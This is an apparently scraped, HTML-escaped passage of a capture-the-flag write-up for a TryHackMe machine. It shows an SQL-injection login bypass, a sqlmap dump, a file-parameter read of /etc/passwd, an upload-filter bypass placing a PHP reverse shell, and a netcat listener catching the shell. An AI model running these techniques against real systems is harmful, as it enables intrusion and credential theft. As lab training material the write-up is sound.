&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3911ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">admin &lt;span class="o">[&lt;/span>Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">admin_101 &lt;span class="o">[&lt;/span>Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 56ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">javascript &lt;span class="o">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 55ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">phpmyadmin &lt;span class="o">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 54ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">server-status &lt;span class="o">[&lt;/span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">704&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:33&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And we got something valueable:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>First of all now we know that the domain is root.thm,&lt;/p>
&lt;p>we can change that by editing the /etc/hosts file:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">127.0.0.1 localhost
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">127.0.1.1 kali
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10.10.229.207 root.thm
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And we can now navigate with the dns name:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>That’s good because now we can start fuzzing the subdomains.&lt;/p>
&lt;p>After trying for some time, I ended up with nothing, so I am going to try brute forcing the login panel instead.&lt;/p>
&lt;p>This also didn’t seem to go anywhere, so maybe I could try with sql injection.&lt;/p>
&lt;p>I tried to put a comment: &lt;code>— -&lt;/code>&lt;/p>
&lt;p>And I got an error message:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%202.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>After trying to do something manually,&lt;/p>
&lt;p>and I managed to enter into the application using an union sql&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hacker&lt;span class="err">&amp;#39;&lt;/span> union &lt;span class="k">select&lt;/span> null,null,null,null#
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%203.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>I don’t really care about the application, but I could use this union sql to gain some credentials.&lt;/p>
&lt;p>After trying for a while, I didn’t manage to reflect the output of the message so that was useless.&lt;/p>
&lt;p>I eventually switched to sqlmap:&lt;/p>
&lt;p>First of all I captured the request in a file using BURP&lt;/p>
&lt;p>and then I used sqlmap to dump the database:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sqlmap -r req.txt -dump
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>email&lt;/th>
&lt;th>created&lt;/th>
&lt;th>password&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>&lt;a class="link" href="mailto:hacker@root.thm" >hacker@root.thm&lt;/a>&lt;/td>
&lt;td>2023-02-21 09:05:46&lt;/td>
&lt;td>&lt;redacted>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>And I found his password.&lt;/p>
&lt;p>I also found two more interesting things:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>url&lt;/th>
&lt;th>password&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>/file1010111/index.php&lt;/td>
&lt;td>&lt;redacted>(&lt;redacted>)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>/upload-cv00101011/index.php&lt;/td>
&lt;td>// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>We can navigate to the first url and put the password found with the sqlmap scan:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%204.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>The site just says:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Parameter Fuzzing is also important :&lt;span class="o">)&lt;/span> or Can you hide DOM elements?
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Apparently the parameter in question is “?file”&lt;/p>
&lt;p>So maybe we can use that to read files in the system:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">root:x:0:0:root:/root:/bin/bash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gnats:x:41:41:Gnats Bug-Reporting System &lt;span class="o">(&lt;/span>admin&lt;span class="o">)&lt;/span>:/var/lib/gnats:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">syslog:x:104:110::/home/syslog:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pollinate:x:111:1::/var/cache/pollinate:/bin/false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bind:x:115:122::/var/cache/bind:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Debian-snmp:x:116:123::/var/lib/snmp:/bin/false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">redis:x:117:124::/var/lib/redis:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And it worked, so now we have the password for the second page:&lt;/p>
&lt;p>which is the user zeamkish.&lt;/p>
&lt;p>Now we can upload a file:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%205.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>And after uploading a file we can go to the source code to see where it is stored:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&amp;lt;h1&amp;gt;File uploaded successfully! Maybe look in &lt;span class="nb">source&lt;/span> code to see the path&amp;lt;span &lt;span class="nv">style&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34; display: none;&amp;#34;&lt;/span>&amp;gt;in /upload_thm_1001 folder&amp;lt;/span&amp;gt; &amp;lt;h1&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%206.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>And it was in fact in the http://10.10.229.207:1337/upload-cv00101011/upload_thm_1001/ folder.&lt;/p>
&lt;p>Now I took the pentestermonkey php reverse shell, and tried to upload it, but it doesn’t do anything, this is because of this function:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> validate&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> var &lt;span class="nv">fileInput&lt;/span> &lt;span class="o">=&lt;/span> document.getElementById&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;file&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> var &lt;span class="nv">file&lt;/span> &lt;span class="o">=&lt;/span> fileInput.files&lt;span class="o">[&lt;/span>0&lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>file&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> var &lt;span class="nv">fileName&lt;/span> &lt;span class="o">=&lt;/span> file.name&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> var &lt;span class="nv">fileExtension&lt;/span> &lt;span class="o">=&lt;/span> fileName.split&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>.pop&lt;span class="o">()&lt;/span>.toLowerCase&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">fileExtension&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;jpg&amp;#39;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nv">fileExtension&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;png&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> // Valid file extension, proceed with file upload
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> // You can submit the form or perform further processing here
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> console.log&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;File uploaded successfully&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> true&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> // Invalid file extension, display an error message or take appropriate action
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> console.log&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;Only JPG and PNG files are allowed&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> false&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>But now we know that it’s a client restriction, so it’s easy to bypass:&lt;/p>
&lt;p>We can just rename the shell rev.png, upload it and intercept the request:&lt;/p>
&lt;p>and then we just change the name to rev.php again&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%207.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>And we can see that it worked:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%208.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Before opening the file I started a listener using nc&lt;/p>
&lt;p>And we are now in the machine with the www-data account:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.11.65.91&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.229.207&lt;span class="o">]&lt;/span> &lt;span class="m">56016&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux ip-10-10-229-207 5.15.0-1039-aws &lt;span class="c1">#44~20.04.1-Ubuntu SMP Thu Jun 22 12:21:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 14:43:16 up 1:46, &lt;span class="m">0&lt;/span> users, load average: 0.01, 0.01, 0.00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: cannot &lt;span class="nb">set&lt;/span> terminal process group &lt;span class="o">(&lt;/span>782&lt;span class="o">)&lt;/span>: Inappropriate ioctl &lt;span class="k">for&lt;/span> device
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: no job control in this shell
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data@ip-10-10-229-207:/$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We also have python so I am going to upgrade my shell:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 -c &lt;span class="s1">&amp;#39;import pty; pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And after entering the zeamkish folder I noticed that he has the credentials for the ssh in plaintext:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls -la
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">total &lt;span class="m">36&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwxr-xr-x &lt;span class="m">3&lt;/span> zeamkish zeamkish &lt;span class="m">4096&lt;/span> Jul &lt;span class="m">6&lt;/span> &lt;span class="m">2023&lt;/span> .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwxr-xr-x &lt;span class="m">4&lt;/span> root root &lt;span class="m">4096&lt;/span> Jun &lt;span class="m">30&lt;/span> &lt;span class="m">2023&lt;/span> ..
